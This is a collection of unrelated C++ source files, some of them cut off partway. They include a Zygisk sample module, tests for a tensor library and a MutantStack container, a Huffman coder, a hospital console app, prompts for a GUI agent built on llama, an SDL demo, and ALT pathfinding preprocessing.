    "/* Copyright 2022-2023 John \"topjohnwu\" Wu\n *\n * Permission to use, copy, modify, and/or distribute this software for any\n * purpose with or without fee is hereby granted.\n *\n * THE SOFTWARE IS PROVIDED \"AS IS\" AND THE AUTHOR DISCLAIMS ALL WARRANTIES WITH\n * REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF MERCHANTABILITY\n * AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY SPECIAL, DIRECT,\n * INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES WHATSOEVER RESULTING FROM\n * LOSS OF USE, DATA OR PROFITS, WHETHER IN AN ACTION OF CONTRACT, NEGLIGENCE OR\n * OTHER TORTIOUS ACTION, ARISING OUT OF OR IN CONNECTION WITH THE USE OR\n * PERFORMANCE OF THIS SOFTWARE.\n */\n\n#include <cstdlib>\n#include <unistd.h>\n#include <fcntl.h>\n#include <android/log.h>\n\n#include \"zygisk.hpp\"\n\nusing zygisk::Api;\nusing zygisk::AppSpecializeArgs;\nusing zygisk::ServerSpecializeArgs;\n\n#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, \"MyModule\", __VA_ARGS__)\n\nclass MyModule : public zygisk::ModuleBase {\npublic:\n    void onLoad(Api *api, JNIEnv *env) override {\n        this->api = api;\n        this->env = env;\n    }\n\n    void preAppSpecialize(AppSpecializeArgs *args) override {\n        // Use JNI to fetch our process name\n        const char *process = env->GetStringUTFChars(args->nice_name, nullptr);\n        preSpecialize(process);\n        env->ReleaseStringUTFChars(args->nice_name, process);\n    }\n\n    void preServerSpecialize(ServerSpecializeArgs *args) override {\n        preSpecialize(\"system_server\");\n    }\n\nprivate:\n    Api *api;\n    JNIEnv *env;\n\n    void preSpecialize(const char *process) {\n        // Demonstrate connecting to to companion process\n        // We ask the companion for a random number\n        unsigned r = 0;\n        int fd = api->connectCompanion();\n        read(fd, &r, sizeof(r));\n        close(fd);\n        LOGD(\"process=[%s], r=[%u]\\n\", process, r);\n\n        // Since we do not hook any functions, we should let Zygisk dlclose ourselves\n        api->setOption(zygisk::Option::DLCLOSE_MODULE_LIBRARY);\n    }\n\n};\n\nstatic int urandom = -1;\n\nstatic void companion_handler(int i) {\n    if (urandom < 0) {\n        urandom = open(\"/dev/urandom\", O_RDONLY);\n    }\n    unsigned r;\n    read(urandom, &r, sizeof(r));\n    LOGD(\"companion r=[%u]\\n\", r);\n    write(i, &r, sizeof(r));\n}\n\n// Register our module class and the companion handler function\nREGISTER_ZYGISK_MODULE(MyModule)\nREGISTER_ZYGISK_COMPANION(companion_handler)\n",
    "// (c) 2025 Mario \"Neo\" Sieg. <mario.sieg.64@gmail.com>\n\n#include \"prelude.hpp\"\n\nTEST(graph_dynamic, simple) {\n    mag_ctx_t* ctx = mag_ctx_create(MAG_COMPUTE_DEVICE_TYPE_CPU);\n    mag_ctx_set_exec_mode(ctx, MAG_EXEC_MODE_EAGER);\n\n    // ((W * X) + B).relu()\n\n    auto* W = mag_tensor_create_2d(ctx, MAG_DTYPE_F32, 2, 2);\n    mag_tensor_fill(W, 0.6f);\n    mag_tensor_set_name(W, \"W\");\n\n    auto* X = mag_tensor_create_2d(ctx, MAG_DTYPE_F32, 2, 2);\n    mag_tensor_fill(X, 2.11f);\n    mag_tensor_set_name(X, \"X\");\n\n    auto* WX = mag_mul(W, X);\n    auto* buf = static_cast<float*>(mag_tensor_data_ptr(WX));\n    for (std::int64_t i=0; i < mag_tensor_numel(WX); ++i) { // op must already be executed\n        ASSERT_EQ(buf[i], 0.6f*2.11f);\n    }\n\n    auto* B = mag_tensor_create_2d(ctx, MAG_DTYPE_F32, 2, 2);\n    mag_tensor_fill(B, 0.1f);\n    mag_tensor_set_name(B, \"B\");\n\n    auto* WXB = mag_add(WX, B);\n    buf = static_cast<float*>(mag_tensor_data_ptr(WXB));\n    for (std::int64_t i=0; i < mag_tensor_numel(WXB); ++i) { // op must already be executed\n        ASSERT_EQ(buf[i], 0.6f*2.11f + 0.1f);\n    }\n\n    mag_tensor_decref(WXB);\n    mag_tensor_decref(B);\n    mag_tensor_decref(WX);\n    mag_tensor_decref(W);\n    mag_tensor_decref(X);\n\n    mag_ctx_destroy(ctx);\n}",
    "#include <iostream>\n#include <string>\n#include <thread>\n#include <chrono>\n#include <framework/socket/tcp/EpollSocketManager.h>\n#include <framework/simulator/TCPSimulator.h>\n#include <framework/config/Configuration.h>\n\nusing namespace hyper::framework;\n\nint main(int argc, char **argv)\n{\n  if (argc < 8)\n  {\n    std::cerr << \"Usage: ./a <string> <int1> <int2>\\n\";\n    return 1;\n  }\n\n  std::string local_ip = argv[1];\n  std::uint16_t local_port = std::stoul(argv[2]);\n  std::string remote_ip = argv[3];\n  std::uint16_t remote_port = std::stoul(argv[4]);\n  std::string socket_type = argv[5];\n  std::string socket_role = argv[6];\n  std::string name = argv[7];\n  std::string message = name + \" \" + argv[8];\n\n  Configuration cfg;\n  cfg.put(\"local_ip\", local_ip);\n  cfg.put(\"local_port\", local_port);\n  cfg.put(\"remote_ip\", remote_ip);\n  cfg.put(\"remote_port\", remote_port);\n  cfg.put(\"socket_type\", socket_type);\n  cfg.put(\"socket_role\", socket_role);\n\n  TCPSimulator sim{name, cfg};\n  if (auto ret = sim.connect(); ret != true)\n  {\n    std::cout << ret << std::endl;\n  }\n  sim.send_data(message);\n  sim.run();\n  if (auto ret = sim.disconnect(); ret != true)\n  {\n    std::cout << ret << std::endl;\n  }\n\n  return 0;\n}",
    "/* ************************************************************************** */\n/*                                                                            */\n/*                                                        :::      ::::::::   */\n/*   main.cpp                                           :+:      :+:    :+:   */\n/*                                                    +:+ +:+         +:+     */\n/*   By: kammi <kammi@student.42.fr>                +#+  +:+       +#+        */\n/*                                                +#+#+#+#+#+   +#+           */\n/*   Created: 2024/12/12 13:39:22 by kammi             #+#    #+#             */\n/*   Updated: 2024/12/12 16:16:30 by kammi            ###   ########.fr       */\n/*                                                                            */\n/* ************************************************************************** */\n\n// #include \"MutantStack.hpp\"\n// #include <iostream>\n// #include <list>\n\n// int main(void)\n// {\n// \t// Test avec MutantStack\n// \tstd::cout << \"Testing MutantStack:\" << std::endl;\n// \tMutantStack<int> mstack;\n// \tmstack.push(5);\n// \tmstack.push(17);\n// \tstd::cout << \"Top element: \" << mstack.top() << std::endl;\n// \tmstack.pop();\n// \tstd::cout << \"Size after pop: \" << mstack.size() << std::endl;\n// \tmstack.push(3);\n// \tmstack.push(5);\n// \tmstack.push(737);\n// \tmstack.push(0);\n\n// \tstd::cout << \"Elements in MutantStack:\" << std::endl;\n// \tfor (MutantStack<int>::iterator it = mstack.begin(); it != mstack.end(); ++it)\n// \t{\n// \t\tstd::cout << *it << std::endl;\n// \t}\n\n// \t// Test des const_iterator avec un objet constant MutantStack\n// \tconst MutantStack<int> const_mstack = mstack;\n// \tstd::cout << \"Elements in const MutantStack (const_iterator):\" << std::endl;\n// \tfor (MutantStack<int>::const_iterator it = const_mstack.begin(); it != const_mstack.end(); ++it)\n// \t{\n// \t\tstd::cout << *it << std::endl;\n// \t}\n\n// \t// Test avec std::list\n// \tstd::cout << \"\\nTesting std::list:\" << std::endl;\n// \tstd::list<int> lst;\n// \tlst.push_back(5);\n// \tlst.push_back(17);\n// \tstd::cout << \"Top element: \" << lst.back() << std::endl;\n// \tlst.pop_back();\n// \tstd::cout << \"Size after pop: \" << lst.size() << std::endl;\n// \tlst.push_back(3);\n// \tlst.push_back(5);\n// \tlst.push_back(737);\n// \tlst.push_back(0);\n\n// \tstd::cout << \"Elements in std::list:\" << std::endl;\n// \tfor (std::list<int>::iterator it = lst.begin(); it != lst.end(); ++it)\n// \t{\n// \t\tstd::cout << *it << std::endl;\n// \t}\n\n// \t// Test des const_iterator avec un objet constant std::list\n// \tconst std::list<int> const_lst = lst;\n// \tstd::cout << \"Elements in const std::list (const_iterator):\" << std::endl;\n// \tfor (std::list<int>::const_iterator it = const_lst.begin(); it != const_lst.end(); ++it)\n// \t{\n// \t\tstd::cout << *it << std::endl;\n// \t}\n\n// \treturn 0;\n// }\n\n#include \"MutantStack.hpp\"\n#include <iostream>\n#include <list>\n\nint main(void)\n{\n    // Test avec MutantStack\n    std::cout << \"Testing MutantStack:\" << std::endl;\n    MutantStack<int> mstack;\n    mstack.push(5);\n    mstack.push(17);\n    std::cout << \"Top element: \" << mstack.top() << std::endl;\n    mstack.pop();\n    std::cout << \"Size after pop: \" << mstack.size() << std::endl;\n    mstack.push(3);\n    mstack.push(5);\n    mstack.push(737);\n    mstack.push(0);\n\n    std::cout << \"Elements in MutantStack:\" << std::endl;\n    for (MutantStack<int>::iterator it = mstack.begin(); it != mstack.end(); ++it)\n    {\n        std::cout << *it << std::endl;\n    }\n\n    // Test des const_iterator avec un objet constant MutantStack\n    const MutantStack<int> const_mstack = mstack;\n    std::cout << \"Elements in const MutantStack (const_iterator):\" << std::endl;\n    for (MutantStack<int>::const_iterator it = const_mstack.begin(); it != const_mstack.end(); ++it)\n    {\n        std::cout << *it << std::endl;\n    }\n\n    // Test des reverse_iterator avec MutantStack\n    std::cout << \"Elements in MutantStack (reverse_iterator):\" << std::endl;\n    for (MutantStack<int>::reverse_iterator rit = mstack.rbegin(); rit != mstack.rend(); ++rit)\n    {\n        std::cout << *rit << std::endl;\n    }\n\n    // Test des const_reverse_iterator avec un objet constant MutantStack\n    std::cout << \"Elements in const MutantStack (const_reverse_iterator):\" << std::endl;\n    for (MutantStack<int>::const_reverse_iterator rit = const_mstack.rbegin(); rit != const_mstack.rend(); ++rit)\n    {\n        std::cout << *rit << std::endl;\n    }\n\n    // Test avec std::list\n    std::cout << \"\\nTesting std::list:\" << std::endl;\n    std::list<int> lst;\n    lst.push_back(5);\n    lst.push_back(17);\n    std::cout << \"Top element: \" << lst.back() << std::endl;\n    lst.pop_back();\n    std::cout << \"Size after pop: \" << lst.size() << std::endl;\n    lst.push_back(3);\n    lst.push_back(5);\n    lst.push_back(737);\n    lst.push_back(0);\n\n    std::cout << \"Elements in std::list:\" << std::endl;\n    for (std::list<int>::iterator it = lst.begin(); it != lst.end(); ++it)\n    {\n        std::cout << *it << std::endl;\n  ",
    "/*\n *  HuffmanCoder.cpp\n *  Daniel Jarka\n *  11/11/24\n *\n *  CS 15 Project 3: Zap\n *\n *  This file contains the implementation of the\n *  HuffmanCoder class.\n*/\n#include <string>\n#include <sstream>\n#include <cstdio>\n#include <cstring>\n#include <istream>\n#include <iostream>\n#include <fstream>\n#include <queue>\n#include <utility>\n\n#include \"HuffmanCoder.h\"\n\nusing namespace std;\n\n/*\n * name:      encoder\n * purpose:   reduces the number of bits used to store text in a file.\n * arguments: a string that represents an input file name and a string that\n *            represents an output file name.\n * returns:   none\n * effects:   encodes a file into binary text, reducing the memory required\n *            to store text.\n */\nvoid HuffmanCoder::encoder(const std::string &inputFile, \nconst std::string &outputFile) {\n    std::ifstream infile(inputFile);\n    if (infile.fail()) {\n        throw runtime_error(\"Unable to open file \" + inputFile);\n    }\n    int c = infile.peek();\n    if(c == EOF) {\n        cout << inputFile << \" is empty and cannot be compressed.\" << endl;\n    }\n    else {\n        count_frequency(infile);\n        infile.close();\n        HuffmanTreeNode *root = build_tree();\n        if (root->is_leaf()) {\n            generate_code(root, \"0\");\n        }\n        else {\n            generate_code(root, \"\");\n        }\n        infile.open(inputFile);\n        std::string binary_code = encode(infile);\n        infile.close();\n        std::string serialized_tree = serialize_tree(root);\n        writeZapFile(outputFile, serialized_tree, binary_code);\n        cout << \"Success! Encoded given text using \" << binary_code.size() \n             << \" bits.\" << endl;\n        delete_tree(root);\n    }\n}\n\n/*\n * name:      decoder\n * purpose:   decodes a binary text file to produce the original text file\n * arguments: a string that represents an input file name and a string that\n *            represents an output file name.\n * returns:   none\n * effects:   creates a file with the decoded text.\n */\nvoid HuffmanCoder::decoder(const std::string &inputFile, \nconst std::string &outputFile) {\n    pair<std::string, std::string> info = readZapFile(inputFile);\n    HuffmanTreeNode *root = deserialize_tree(info.first);\n    int i = 0;\n    std::string decoded_text = decode(root, info.second, i);\n    std::ofstream outfile(outputFile);\n    if (outfile.fail()) {\n        throw runtime_error(\"Unable to open file \" + outputFile);\n    }\n    printToFile(outfile, decoded_text);\n    outfile.close();\n    delete_tree(root);\n    return;\n}\n\n/*\n * name:      count_frequency\n * purpose:   counts the frequency of each character in a text file\n * arguments: an istream object that is used to read inputs.\n * returns:   none\n * effects:   stores character frequencies in an array of size 256.\n */\nvoid HuffmanCoder::count_frequency(std::istream &input) {\n    char curr_char;\n    while (input.get(curr_char)) {\n        freq_array[int(curr_char)] += 1;\n    }\n}\n\n/*\n * name:      build_tree\n * purpose:   creates a huffman tree that will be used to create binary\n *            encodings. \n * arguments: none\n * returns:   pointer to the root of the huffman tree\n * effects:   builds a huffman tree\n */\nHuffmanTreeNode* HuffmanCoder::build_tree() {\npriority_queue<HuffmanTreeNode *, vector<HuffmanTreeNode *>,\n                NodeComparator> pq;\n    for (int i = 0; i < 256; ++i) {\n        if (freq_array[i] != 0) {\n            HuffmanTreeNode *new_node = \n                                new HuffmanTreeNode(char(i), freq_array[i]);\n            pq.push(new_node);\n        }\n    }\n\n    while (pq.size() > 1) {\n        HuffmanTreeNode *min1 = pq.top();\n        pq.pop();\n        HuffmanTreeNode *min2 = pq.top();\n        pq.pop();\n        HuffmanTreeNode *parent = new HuffmanTreeNode('\\0', \n                            min1->get_freq() + min2->get_freq(), min1, min2);\n        pq.push(parent);\n    }\n    HuffmanTreeNode *root = pq.top();\n    return root;\n}\n\n/*\n * name:      generate_code\n * purpose:   creates binary encodings for each leaf in the huffman tree.\n * arguments: pointer to the root of a huffman tree and a string that will\n *            update recursively to store binary encodings.\n * returns:   none\n * effects:   stores binary encodings of each character in huffman tree in a\n *            new array of size 256.\n */\nvoid HuffmanCoder::generate_code(HuffmanTreeNode *root, std::string code) {\n    if (root == nullptr) {\n        return;\n    }\n    if (root->is_leaf()) {\n        binary_code_array[int(root->get_val())] = code;\n        return;\n    }\n    generate_code(root->get_left(), code + \"0\");\n    generate_code(root->get_right(), code + \"1\");\n}\n\n/*\n * name:      encode\n * purpose:   converts input text into binary encoding\n * arguments: istream object that represents input to read from\n * returns:   a string that contains the binary encoding of the file or input\n * effects:   none\n */\nstd::string HuffmanCoder::encode(std::istream &input) {\n    char curr_char;\n    std::string result;\n    w",
    "#include <iostream>\n#include <vector>\n#include <string>\n#include <iomanip> // For formatted output\n#include <chrono>\n#include <thread>\n#ifdef _WIN32\n#include <windows.h> // For Windows color support\n#else\n#include <unistd.h>\n#endif\nusing namespace std;\n// Utility function to set terminal color\nvoid setColor(int color) {\n#ifdef _WIN32\n    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);\n    SetConsoleTextAttribute(hConsole, color);\n#else\n    string colorCode = \"\\033[0;\" + to_string(color) + \"m\";\n    cout << colorCode;\n#endif\n}\n// Utility function to reset color\nvoid resetColor() {\n#ifdef _WIN32\n    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);\n    SetConsoleTextAttribute(hConsole, 7);\n#else\n    cout << \"\\033[0m\";\n#endif\n}\n// Loading animation\nvoid showLoading(const string& message) {\n    cout << message;\n    for (int i = 0; i < 3; ++i) {\n        cout << \".\";\n        cout.flush();\n        this_thread::sleep_for(chrono::milliseconds(500));\n    }\n    cout << \"\\n\";\n}\n// Patient class\nclass Patient {\npublic:\n    int id;\n    string name;\n    int age;\n    string gender;\n    string ailment;\n\n    Patient(int p_id, string p_name, int p_age, string p_gender, string p_ailment)\n        : id(p_id), name(p_name), age(p_age), gender(p_gender), ailment(p_ailment) {\n    }\n};\n// Doctor class\nclass Doctor {\npublic:\n    int id;\n    string name;\n    string specialty;\n    vector<int> patientIds;\n\n    Doctor(int d_id, string d_name, string d_specialty)\n        : id(d_id), name(d_name), specialty(d_specialty) {\n    }\n};\n// Appointment class\nclass Appointment {\npublic:\n    int id;\n    int patientId;\n    int doctorId;\n    string date;\n    string time;\n\n    Appointment(int a_id, int p_id, int d_id, string a_date, string a_time)\n        : id(a_id), patientId(p_id), doctorId(d_id), date(a_date), time(a_time) {\n    }\n};\n// Global storage\nvector<Patient> patients;\nvector<Doctor> doctors;\nvector<Appointment> appointments;\n\n// Utility functions\nvoid displayLine() {\n    setColor(11); // Cyan color\n    cout << \"===========================================\" << endl;\n    resetColor();\n}\n// Patient Management\nvoid addPatient() {\n    int id, age;\n    string name, gender, ailment;\n    setColor(10); // Green color\n    cout << \"Adding a new patient...\" << endl;\n    resetColor();\n    cout << \"Enter Patient ID: \";\n    cin >> id;\n    cout << \"Enter Name: \";\n    cin.ignore();\n    getline(cin, name);\n    cout << \"Enter Age: \";\n    cin >> age;\n    cout << \"Enter Gender: \";\n    cin >> gender;\n    cout << \"Enter Ailment: \";\n    cin.ignore();\n    getline(cin, ailment);\n\n    patients.emplace_back(id, name, age, gender, ailment);\n    showLoading(\"Saving patient record\");\n    setColor(10);\n    cout << \"Patient added successfully!\" << endl;\n    resetColor();\n}\nvoid displayPatients() {\n    if (patients.empty()) {\n        setColor(12); // Red color\n        cout << \"No patients found.\" << endl;\n        resetColor();\n        return;\n    }\n    displayLine();\n    setColor(14); // Yellow color\n    cout << setw(5) << \"ID\" << setw(15) << \"Name\" << setw(10) << \"Age\" << setw(10) << \"Gender\" << setw(20) << \"Ailment\" << endl;\n    displayLine();\n    resetColor();\n    for (const auto& patient : patients) {\n        cout << setw(5) << patient.id << setw(15) << patient.name << setw(10) << patient.age\n            << setw(10) << patient.gender << setw(20) << patient.ailment << endl;\n    }\n}\n// Doctor Management\nvoid addDoctor() {\n    int id;\n    string name, specialty;\n    setColor(10); // Green color\n    cout << \"Adding a new doctor...\" << endl;\n    resetColor();\n    cout << \"Enter Doctor ID: \";\n    cin >> id;\n    cout << \"Enter Name: \";\n    cin.ignore();\n    getline(cin, name);\n    cout << \"Enter Specialty: \";\n    getline(cin, specialty);\n\n    doctors.emplace_back(id, name, specialty);\n    showLoading(\"Saving doctor record\");\n    setColor(10);\n    cout << \"Doctor added successfully!\" << endl;\n    resetColor();\n}\nvoid displayDoctors() {\n    if (doctors.empty()) {\n        setColor(12); // Red color\n        cout << \"No doctors found.\" << endl;\n        resetColor();\n        return;\n    }\n    displayLine();\n    setColor(14); // Yellow color\n    cout << setw(5) << \"ID\" << setw(15) << \"Name\" << setw(20) << \"Specialty\" << endl;\n    displayLine();\n    resetColor();\n    for (const auto& doctor : doctors) {\n        cout << setw(5) << doctor.id << setw(15) << doctor.name << setw(20) << doctor.specialty << endl;\n    }\n}\n// Appointment Management\nvoid scheduleAppointment() {\n    int id, patientId, doctorId;\n    string date, time;\n    setColor(10); // Green color\n    cout << \"Scheduling a new appointment...\" << endl;\n    resetColor();\n    cout << \"Enter Appointment ID: \";\n    cin >> id;\n    cout << \"Enter Patient ID: \";\n    cin >> patientId;\n    cout << \"Enter Doctor ID: \";\n    cin >> doctorId;\n    cout << \"Enter Date (YYYY-MM-DD): \";\n    cin >> date;\n    cout << \"Enter Time (HH:MM): \";\n    cin >> time;\n\n    appointments.emplace_back(id, patientId, doctorId, date, time);\n    showLoading(\"S",
    "#include \"arg.h\"\n#include \"base64.hpp\"\n#include \"log.h\"\n#include \"common.h\"\n#include \"sampling.h\"\n#include \"clip.h\"\n#include \"llava.h\"\n#include \"llama.h\"\n#include \"ggml.h\"\n\n#ifdef GGML_USE_CUDA\n#include \"ggml-cuda.h\"\n#endif\n#ifdef NDEBUG\n#include \"ggml-alloc.h\"\n#include \"ggml-backend.h\"\n#endif\n\n#include <cstdio>\n#include <cstdlib>\n#include <cstring>\n#include <vector>\n#include <algorithm>\n#include <iostream>\n#include <fstream>\n#include <json.hpp>\n#include <thread>\n#include <string>\n#include <atomic>\n#include <mutex>\n#include \"json-schema-to-grammar.h\"\n\n//TODO: Update to replace with user OS\nconst std::string PLANNER_SYSTEM_PROMPT = R\"(You are using a Windows device.\nYou are able to use a mouse and keyboard to interact with the computer based on the given task and screenshot.\nYou can only interact with the desktop GUI (no terminal or application menu access).\n\nYou may be given some history plan and actions, this is the response from the previous loop.\nYou should carefully consider your plan base on the task, screenshot, and history actions.\n\nYour available \"Next Action\" only include:\n- ENTER: Press an enter key.\n- ESCAPE: Press an ESCAPE key.\n- INPUT: Input a string of text.\n- CLICK: Describe the ui element to be clicked.\n- HOVER: Describe the ui element to be hovered.\n- SCROLL: Scroll the screen, you must specify up or down.\n- PRESS: Describe the ui element to be pressed.\n\nOutput format:\n```json\n{{\n    \"Im Thinking\": str, # describe your thoughts on how to achieve the task, choose one action from available actions at a time.\n    \"Next Action\": \"action_type, action description\" | \"None\" # one action at a time, describe it in short and precisely. \n}}\n```\n\nOne Example:\n```json\n{{  \n    \"Im Thinking\": \"I need to search and navigate to amazon.com.\",\n    \"Next Action\": \"CLICK 'Search Google or type a URL'.\"\n}}\n```\n\nIMPORTANT NOTES:\n1. Carefully observe the screenshot to understand the current state and read history actions.\n2. You should only give a single action at a time. for example, INPUT text, and ENTER can't be in one Next Action.\n3. Attach the text to Next Action, if there is text or any description for the button. \n4. You should not include other actions, such as keyboard shortcuts.\n6. When the task is completed, you should say \"Next Action\": \"None\" in the json field.\n\n<PREV_STEPS>\n)\";\n\nconst std::string PLANNER_JSON_SCHEMA = R\"({\n  \"$schema\": \"http://json-schema.org/draft-07/schema#\",\n  \"type\": \"object\",\n  \"properties\": {\n    \"Im Thinking\": {\n      \"type\": \"string\",\n      \"description\": \"Describe your thoughts on how to achieve the task, choose one action from available actions at a time.\"\n    },\n    \"Next Action\": {\n      \"type\": \"string\",\n      \"description\": \"One action at a time, describe it in short and precisely. Format: 'action_type, action description' or 'None'.\"\n    }\n  },\n  \"required\": [\"Im Thinking\", \"Next Action\"],\n  \"additionalProperties\": false\n})\";\n\nconst std::string EXECUTOR_SYSTEM_PROMPT = R\"(You are an assistant trained to navigate the desktop screen. \nGiven a task instruction, a screen observation, and an action history sequence, \noutput the next action and wait for the next observation. \nFormat the action as a dictionary with the following keys:\n{'action': 'ACTION_TYPE', 'value': 'element', 'position': [x,y]}\n\nIf value or position is not applicable, set it as None.\nPosition might be [[x1,y1], [x2,y2]] if the action requires a start and end position.\nPosition represents the relative coordinates on the screenshot and should be scaled to a range of 0-1.\n\nHere is the action space:\n1. CLICK: Click on an element, value is not applicable and the position [x,y] is required. \n2. INPUT: Type a string into an element, value is a string to type and the position [x,y] is required. \n3. HOVER: Hover on an element, value is not applicable and the position [x,y] is required.\n4. ENTER: Enter operation, value and position are not applicable.\n5. SCROLL: Scroll the screen, value is the direction to scroll and the position is not applicable.\n6. ESC: ESCAPE operation, value and position are not applicable.\n7. PRESS: Long click on an element, value is not applicable and the position [x,y] is required.\n\n<PREV_STEPS>\n\n)\";\n\nconst std::string EXECUTOR_JSON_SCHEMA = R\"({\n  \"$schema\": \"http://json-schema.org/draft-07/schema#\",\n  \"oneOf\": [\n    {\n      \"type\": \"object\",\n      \"required\": [\"action\", \"position\"],\n      \"properties\": {\n        \"action\": { \"type\": \"string\", \"const\": \"CLICK\" },\n        \"value\": { \"type\": \"null\" },\n        \"position\": {\n          \"type\": \"array\",\n          \"items\": { \"type\": \"number\" },\n          \"minItems\": 2,\n          \"maxItems\": 2\n        }\n      },\n      \"additionalProperties\": false\n    },\n    {\n      \"type\": \"object\",\n      \"required\": [\"action\", \"value\", \"position\"],\n      \"properties\": {\n        \"action\": { \"type\": \"string\", \"const\": \"INPUT\" },\n        \"value\": { \"type\": \"string\" },\n        \"position\": {\n          \"type\": \"array\",\n          \"items\": { \"type\": \"number\" },\n       ",
    "#include <SDL2/SDL.h>\n#include <SDL2/SDL_video.h>\n#include <iostream>\n//make sure to download relevant SDL libraries\nSDL_Window* gWind;\nSDL_Renderer* gRend;\nint fullWidth, fullHeight;\nbool init() //initializes SDL, global renderer and window\n{\n\tif(SDL_Init( SDL_INIT_VIDEO ) < 0) \n\t{\n\t\tstd::cout << \"SDL could not initalize\\n\"  << SDL_GetError(); \n\t\treturn false;\n\t}\n\tSDL_DisplayMode d;\n\tSDL_GetCurrentDisplayMode(0, &d);\n\tfullWidth = d.w;\n\tfullHeight = d.h;\n\tgWind = SDL_CreateWindow( \"TicTacToe\",  SDL_WINDOWPOS_UNDEFINED, SDL_WINDOWPOS_UNDEFINED, fullWidth, fullHeight, SDL_WINDOW_SHOWN);\n\tif(gWind == nullptr) { std::cout << \"error returning wind\\n\"; return false; }\n\tgRend = SDL_CreateRenderer(gWind, -1, SDL_RENDERER_ACCELERATED/* | SDL_RENDERER_PRESENTVSYNC */);\n\tif(gRend == nullptr) { std::cout << \"error returning rend\\n\"; return false; }\n\treturn true;\n}\nvoid cleanup()\n{\n\tSDL_DestroyRenderer(gRend);\n\tSDL_DestroyWindow(gWind);\n\t//IMG_Quit();\n\tSDL_Quit();\n}\nint main(int argc, char* argv[])\n{\n\tstd::cout << \"hi\\n\";\n\tif(!init()) { std::cout << \"failure init\\n\"; cleanup(); return 0; }\n\tif(gWind == nullptr) {std::cout << \"wtf\\n\"; }\n\tSDL_Event e;\n\tbool quit = false;\n\twhile( !quit )\n\t{\n\t\twhile(SDL_PollEvent(&e) != 0)\n\t\t{\n\t\t\tif(e.type == SDL_QUIT) { quit = true; }\t\n\t\t}\n\t\tSDL_SetRenderDrawColor( gRend, 255, 255, 25, 255);\n\t\tSDL_RenderClear( gRend);\n\t\tSDL_RenderPresent(gRend);\n\t}\n\tcleanup();\n}\n",
    "\ufeff// \u2705 file verified.\n#include \"incl.h\"\n#include \"decl.h\"\n\n// \u2705 function + comment verified.\n/**\n * @brief Precomputes landmark-based shortest path estimates using the ALT heuristic.\n *\n * @detailed\n * This function implements ALT (A* Landmarks and Triangle Inequality) preprocessing, which enhances\n * heuristic pathfinding by precomputing distances from selected landmark nodes.\n *\n * Functionality:\n * - Uses the farthest-node method to select optimal landmarks.\n * - Computes shortest-path distances using Dijkstra\u2019s algorithm.\n * - Optionally loads or stores precomputed landmark data for reuse.\n *\n * Steps of the Algorithm:\n * 1. If `save_alt` is enabled, attempt to load precomputed landmark data from storage.\n * 2. Initialize storage structures for distance calculations.\n * 3. Select the first landmark as an arbitrary node (first node in the dataset).\n * 4. Compute shortest-path distances using Dijkstra\u2019s algorithm:\n *    - `dist_landmark_to[i][j]` stores the shortest path distance **to** node `i` from landmark `j`.\n *    - `dist_landmark_from[i][j]` stores the shortest path distance **from** node `i` to landmark `j`.\n * 5. Iteratively select `nb_alt` landmarks using the farthest-node heuristic:\n *    - Find the node that has the maximum minimum distance from previous landmarks.\n *    - Recompute shortest-path distances using Dijkstra\u2019s algorithm.\n *    - If no more landmarks can be choosen, break the loop and modify the configuration.\n * 6. If `save_alt` is enabled, store the precomputed landmark data.\n *\n * Mathematical Background:\n * - Landmark heuristics use the triangle inequality:\n *\n *     h(n) = max{ |d_L(goal) - d_L(n)|, |d_F(n) - d_F(goal)| }\n *\n *   where:\n *   - `d_L(n)` is the precomputed distance from landmark `L` to node `n`.\n *   - `d_F(n)` is the precomputed distance from node `n` to landmark `L`.\n *\n * - The farthest-node landmark selection ensures a wide spread of landmarks,\n *   improving heuristic accuracy in large graphs.\n *\n * Edge Cases:\n * - If no valid landmarks are found, preprocessing stops early.\n * - If loading precomputed landmarks fails, it falls back to computation.\n *\n * @param gdata Reference to the graph data structure.\n * @param conf Reference to the configuration settings, which determine landmark count and storage options.\n *\n * @complexity\n * - Time Complexity: O(nb_alt * (E log V))\n *   - Each landmark selection involves a Dijkstra search \u2192 O(E log V).\n *   - `nb_alt` landmark selections are performed.\n * - Space Complexity: O(V * nb_alt)\n *   - Each node stores distances to all selected landmarks.\n */\nvoid preprocessAlt(graph& gdata, config& conf)\n{\n    if (conf.save_alt)\n    {\n        if (loadAltData(gdata, conf)) {\n            return;\n        }\n    }\n\n    logger(\"selecting landmarks using farthest-node strategy\");\n\n    size_t n = gdata.node_to_index.size();\n\n    std::vector<int> landmarks;\n    landmarks.reserve(conf.nb_alt);\n    std::vector<int> md(n, std::numeric_limits<int>::max());\n    std::vector<int> d(n, -1);\n\n    gdata.dist_landmark_to.resize(n, std::vector<int>(conf.nb_alt, -1));\n    gdata.dist_landmark_from.resize(n, std::vector<int>(conf.nb_alt, -1));\n\n    int fl = gdata.node_to_index.begin()->first;\n    landmarks.push_back(fl);\n    console(\"info\", \"processing landmark \" + std::to_string(fl) + \" (1/\" + std::to_string(conf.nb_alt) + \")\");\n    logger(\"processing landmark \" + std::to_string(fl) + \" (1/\" + std::to_string(conf.nb_alt) + \")\");\n\n    d = dijkstraSingleSource(gdata.adjacency, fl, n, gdata.node_to_index);\n    {\n        int i = 0;\n        for (auto& kv : gdata.node_to_index) {\n            size_t idx = kv.second;\n            gdata.dist_landmark_to[idx][i] = d[idx];\n            gdata.dist_landmark_from[idx][i] = d[idx];\n            if (d[idx] >= 0 && d[idx] < md[idx]) md[idx] = d[idx];\n        }\n    }\n\n    for (int i = 1; i < conf.nb_alt; ++i) {\n        int nl = -1;\n        int mx = -1;\n\n        for (auto& kv : gdata.node_to_index) {\n            size_t idx = kv.second;\n            if (md[idx] > mx) {\n                mx = md[idx];\n                nl = kv.first;\n            }\n        }\n\n        if (nl == -1) {\n            logger(\"warning: only selected \" + std::to_string(landmarks.size()) + \" landmarks as the number of requested landmarks exceeds the number of available nodes. setting new value inside the config.\");\n            console(\"warning\", \"only selected \" + std::to_string(landmarks.size()) + \" landmarks as the number of requested landmarks exceeds the number of available nodes. setting new value inside the config.\");\n            \n            conf.nb_alt = landmarks.size();\n            updateNbAlt(conf, conf.nb_alt);\n\n            break;\n        }\n\n        landmarks.push_back(nl);\n        console(\"info\", \"processing landmark \" + std::to_string(nl) +\n            \" (\" 